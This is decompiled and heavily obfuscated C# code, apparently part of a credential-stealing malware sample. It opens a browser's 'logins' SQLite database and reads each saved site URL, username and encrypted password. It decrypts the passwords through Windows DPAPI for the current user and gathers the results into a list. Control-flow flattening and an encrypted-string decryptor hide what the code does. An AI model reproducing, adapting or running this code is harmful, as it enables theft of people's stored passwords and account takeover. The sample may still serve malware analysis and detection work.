using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

// Token: 0x0200002A RID: 42
internal sealed class clw
{
	// Token: 0x0600010B RID: 267 RVA: 0x000239BC File Offset: 0x00021BBC
	internal static List<clo> clq(string clz, string cmn, string cmo = "logins")
	{
		List<clo> list = new List<clo>();
		if (!File.Exists(clz))
		{
			return list;
		}
		jwq jwq;
		try
		{
			jwq = new jwq(clz);
		}
		catch (Exception ex)
		{
			return list;
		}
		if (jwq.kry(cmo))
		{
			goto IL_64;
		}
		IL_37:
		int num = 1270842645;
		IL_3C:
		switch ((num ^ 1908089068) % 4)
		{
		case 0:
		{
			IL_64:
			string text = string.Empty;
			num = 1978624386;
			goto IL_3C;
		}
		case 1:
			return list;
		case 3:
			goto IL_37;
		}
		string text2 = string.Empty;
		string text3 = string.Empty;
		int num2 = 0;
		int num3 = checked(jwq.ktv() - 1);
		int num4 = num2;
		for (;;)
		{
			if (num4 <= num3)
			{
				try
				{
					string text = jwq.kuv(num4, <Module>.smethod_strings_decryptor(320624 -> "origin_url")));
					text2 = jwq.kuv(num4, <Module>.smethod_strings_decryptor(320600 -> "username_value")));
					text3 = clw.cno(jwq.kuv(num4, <Module>.smethod_strings_decryptor(320672 -> "password_value"))));
					if (!string.IsNullOrEmpty(text))
					{
						for (;;)
						{
							IL_1B7:
							uint num5 = 1650759195u;
							for (;;)
							{
								uint num6;
								switch ((num6 = (num5 ^ 1908089068u)) % 7u)
								{
								case 0u:
								{
									clo clo;
									clo.clx = cmn;
									num5 = (num6 * 2319934876u ^ 2323269452u);
									continue;
								}
								case 1u:
								{
									clo clo = new clo();
									clo.cly = text;
									clo.clu = text2;
									clo.clv = text3;
									num5 = (num6 * 1239049928u ^ 2158681576u);
									continue;
								}
								case 2u:
									if (text3 != null)
									{
										num5 = (num6 * 2481761736u ^ 964362803u);
										continue;
									}
									break;
								case 3u:
								{
									clo clo;
									list.Add(clo);
									num5 = (num6 * 879716646u ^ 2833252949u);
									continue;
								}
								case 5u:
									if (!string.IsNullOrEmpty(text2))
									{
										num5 = (num6 * 2064738247u ^ 1166676366u);
										continue;
									}
									break;
								case 6u:
									goto IL_1B7;
								}
								goto Block_11;
							}
						}
						Block_11:;
					}
					goto IL_244;
				}
				catch (Exception ex2)
				{
					for (;;)
					{
						IL_207:
						uint num7 = 1239167220u;
						for (;;)
						{
							uint num6;
							switch ((num6 = (num7 ^ 1908089068u)) % 3u)
							{
							case 1u:
								num7 = (num6 * 3398486821u ^ 2647820122u);
								continue;
							case 2u:
								goto IL_207;
							}
							goto Block_13;
						}
					}
					Block_13:
					goto IL_244;
				}
				goto IL_210;
				IL_244:
				checked
				{
					num4++;
					goto IL_210;
				}
			}
			int num8 = 442132939;
			IL_215:
			switch ((num8 ^ 1908089068) % 4)
			{
			case 0:
				IL_210:
				num8 = 1592328438;
				goto IL_215;
			case 2:
				continue;
			case 3:
				return list;
			}
			break;
		}
		List<clo> result;
		return result;
	}

	// Token: 0x0600010C RID: 268 RVA: 0x00023C4C File Offset: 0x00021E4C
	private static string cno(string cnp)
	{
		if (cnp != null)
		{
			for (;;)
			{
				IL_42:
				uint num = 123580748u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 1370161702u)) % 3u)
					{
					case 0u:
						goto IL_42;
					case 2u:
						if (cnp.Length == 0)
						{
							num = (num2 * 10309024u ^ 4156359618u);
							continue;
						}
						goto IL_49;
					}
					goto Block_3;
				}
			}
			Block_3:
			goto IL_78;
			string result;
			try
			{
				IL_49:
				result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(cnp), null, DataProtectionScope.CurrentUser));
			}
			catch (Exception ex)
			{
				result = null;
			}
			return result;
		}
		IL_78:
		return null;
	}
}
